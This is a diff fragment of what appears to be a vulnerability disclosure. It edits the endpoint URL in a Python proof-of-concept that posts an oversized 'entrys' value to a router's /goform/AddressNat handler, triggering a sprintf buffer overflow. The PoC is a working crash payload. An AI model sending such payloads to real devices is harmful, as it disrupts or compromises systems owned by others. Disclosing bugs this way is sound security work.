@@ -24,7 +24,7 @@ get value from entrys ,then call sprintf, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/fromAddressNat"
+url = "http://192.168.1.13/goform/AddressNat"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'entrys': payload})
